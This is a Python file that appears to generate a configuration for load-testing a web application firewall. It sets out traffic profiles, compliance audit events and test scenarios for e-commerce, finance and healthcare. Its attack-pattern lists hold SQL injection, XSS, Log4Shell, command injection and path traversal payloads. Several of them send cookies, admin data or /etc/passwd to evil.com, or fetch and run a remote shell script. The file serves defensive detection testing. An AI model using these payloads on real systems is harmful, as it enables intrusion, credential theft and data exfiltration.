# Enterprise Load Testing Configuration
# Defines realistic enterprise traffic patterns and attack scenarios

import json
import random
from dataclasses import dataclass
from typing import List, Dict, Any

@dataclass
class EnterpriseAttackPattern:
    name: str
    attack_type: str
    payloads: List[str]
    frequency: float  # Per hour
    sophistication: int  # 1-10 scale

@dataclass  
class EnterpriseTrafficProfile:
    name: str
    requests_per_second: int
    concurrent_users: int
    geographic_distribution: Dict[str, float]
    user_agent_distribution: Dict[str, float]
    endpoint_distribution: Dict[str, float]

# Define enterprise attack patterns based on real-world threats
ENTERPRISE_ATTACK_PATTERNS = [
    EnterpriseAttackPattern(
        name="Advanced SQL Injection",
        attack_type="SQLi", 
        payloads=[
            "1' UNION SELECT user,password,email FROM admin_users WHERE '1'='1",
            "'; EXEC xp_cmdshell('net user hacker password123 /add'); --",
            "1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 AND '1'='1",
            "admin'/**/UNION/**/SELECT/**/@@version,user(),database()#",
        ],
        frequency=2.5,  # Per hour
        sophistication=8
    ),
    
    EnterpriseAttackPattern(
        name="Business Logic XSS",
        attack_type="XSS",
        payloads=[
            "<script>fetch('/api/admin/users').then(r=>r.json()).then(d=>fetch('http://evil.com',{method:'POST',body:JSON.stringify(d)}))</script>",
            "<img src=x onerror='new Image().src=\"http://evil.com/steal?\"+document.cookie'>",
            "\"><svg/onload=eval(atob('ZmV0Y2goJy9hcGkvYWRtaW4vdXNlcnMnKQ=='))>",
        ],
        frequency=5.2,
        sophistication=7
    ),
    
    EnterpriseAttackPattern(
        name="Remote Code Execution",
        attack_type="RCE", 
        payloads=[
            "${jndi:ldap://evil.com:1389/Exploit}",  # Log4Shell
            "{{7*7}}",  # Template injection
            "__import__('os').system('curl http://evil.com/backdoor.sh | bash')",
            "; curl -o /tmp/shell.php http://evil.com/shell.txt; php /tmp/shell.php",
        ],
        frequency=1.8,
        sophistication=9
    ),
    
    EnterpriseAttackPattern(
        name="API Abuse & Data Exfiltration", 
        attack_type="API_ABUSE",
        payloads=[
            "/api/v1/users?limit=999999&format=json",  # Mass data extraction
            "/api/internal/debug/config?export=true", # Internal API abuse
            "/api/admin/backup?format=sql&tables=all", # Database dumping
        ],
        frequency=12.5,
        sophistication=6
    ),
    
    EnterpriseAttackPattern(
        name="Advanced Path Traversal",
        attack_type="LFI",
        payloads=[
            "....//....//....//etc/passwd%00",
            "/proc/self/environ",
            "php://filter/convert.base64-encode/resource=/etc/passwd",
            "expect://curl -X POST -d @/etc/passwd http://evil.com/upload",
        ],
        frequency=8.3,
        sophistication=7
    ),
]

# Define enterprise traffic profiles for different business types
ENTERPRISE_TRAFFIC_PROFILES = [
    EnterpriseTrafficProfile(
        name="E-commerce Peak",
        requests_per_second=15000,
        concurrent_users=5000,
        geographic_distribution={
            "US": 0.4, "EU": 0.3, "APAC": 0.2, "Other": 0.1
        },
        user_agent_distribution={
            "Chrome": 0.65, "Safari": 0.20, "Firefox": 0.10, "Other": 0.05
        },
        endpoint_distribution={
            "/api/products": 0.30,
            "/api/search": 0.25, 
            "/api/cart": 0.20,
            "/api/checkout": 0.15,
            "/api/user": 0.10
        }
    ),
    
    EnterpriseTrafficProfile(
        name="Financial Services",
        requests_per_second=8000,
        concurrent_users=2000, 
        geographic_distribution={
            "US": 0.6, "EU": 0.25, "APAC": 0.1, "Other": 0.05
        },
        user_agent_distribution={
            "Chrome": 0.55, "Safari": 0.25, "Edge": 0.15, "Other": 0.05
        },
        endpoint_distribution={
            "/api/accounts": 0.35,
            "/api/transactions": 0.30,
            "/api/transfers": 0.20,
            "/api/auth": 0.15
        }
    ),
    
    EnterpriseTrafficProfile(
        name="Healthcare SaaS",
        requests_per_second=5000,
        concurrent_users=1200,
        geographic_distribution={
            "US": 0.8, "CA": 0.1, "EU": 0.08, "Other": 0.02
        },
        user_agent_distribution={
            "Chrome": 0.70, "Safari": 0.15, "Firefox": 0.10, "Edge": 0.05
        },
        endpoint_distribution={
            "/api/patients": 0.40,
            "/api/appointments": 0.25,
            "/api/medical-records": 0.20,
            "/api/billing": 0.15
        }
    ),
]

def generate_enterprise_test_config():
    """Generate comprehensive test configuration for enterprise scenarios"""
    
    config = {
        "metadata": {
            "version": "1.0", 
            "generated_at": "2024-01-15T10:00:00Z",
            "description": "Enterprise WAF Testing Configuration"
        },
        
        "performance_targets": {
            "min_throughput_rps": 5000,
            "max_latency_ms": 100,
            "min_availability_percent": 99.9,
            "max_memory_growth_mb": 100,
            "max_error_rate_percent": 0.1
        },
        
        "security_targets": {
            "min_detection_rate_percent": 95.0,
            "max_false_positive_percent": 2.0,
            "attack_patterns": [
                {
                    "name": pattern.name,
                    "type": pattern.attack_type, 
                    "payloads": pattern.payloads,
                    "frequency_per_hour": pattern.frequency,
                    "sophistication": pattern.sophistication
                }
                for pattern in ENTERPRISE_ATTACK_PATTERNS
            ]
        },
        
        "traffic_profiles": [
            {
                "name": profile.name,
                "rps": profile.requests_per_second,
                "concurrent_users": profile.concurrent_users,
                "geo_distribution": profile.geographic_distribution,
                "user_agents": profile.user_agent_distribution, 
                "endpoints": profile.endpoint_distribution
            }
            for profile in ENTERPRISE_TRAFFIC_PROFILES
        ],
        
        "compliance_requirements": {
            "pci_dss": {
                "required": True,
                "audit_events": [
                    "card_data_access", "payment_processing", 
                    "cardholder_data_storage", "key_management"
                ]
            },
            "gdpr": {
                "required": True,
                "audit_events": [
                    "eu_user_data_access", "data_export_request",
                    "data_deletion_request", "consent_changes"
                ]
            },
            "hipaa": {
                "required": True,
                "audit_events": [
                    "phi_access", "patient_record_update", 
                    "medical_data_export", "unauthorized_access_attempt"
                ]
            },
            "sox": {
                "required": True,
                "audit_events": [
                    "financial_data_access", "audit_log_access",
                    "configuration_changes", "admin_actions"
                ]
            }
        },
        
        "test_scenarios": [
            {
                "name": "Peak E-commerce Load",
                "description": "Black Friday level traffic with attack simulation",
                "duration_minutes": 10,
                "rps": 15000,
                "concurrent_users": 5000,
                "attack_injection_rate": 0.05,  # 5% of requests are attacks
                "geographic_simulation": True,
                "compliance_logging": ["PCI-DSS", "GDPR"]
            },
            
            {
                "name": "Financial Services Under Attack",
                "description": "Banking application under targeted attack",
                "duration_minutes": 15,
                "rps": 8000, 
                "concurrent_users": 2000,
                "attack_injection_rate": 0.15,  # 15% attack rate
                "sophisticated_attacks": True,
                "compliance_logging": ["PCI-DSS", "SOX"]
            },
            
            {
                "name": "Healthcare Compliance Audit",
                "description": "HIPAA compliant logging under normal load",
                "duration_minutes": 20,
                "rps": 5000,
                "concurrent_users": 1200, 
                "attack_injection_rate": 0.02,  # 2% background attacks
                "audit_mode": True,
                "compliance_logging": ["HIPAA", "SOX"]
            }
        ]
    }
    
    return config

if __name__ == "__main__":
    config = generate_enterprise_test_config()
    
    with open("enterprise_test_config.json", "w") as f:
        json.dump(config, f, indent=2)
    
    print("✅ Enterprise test configuration generated: enterprise_test_config.json")
    print(f"📊 {len(ENTERPRISE_ATTACK_PATTERNS)} attack patterns configured")
    print(f"🏢 {len(ENTERPRISE_TRAFFIC_PROFILES)} traffic profiles defined")
    print(f"🧪 {len(config['test_scenarios'])} test scenarios created")
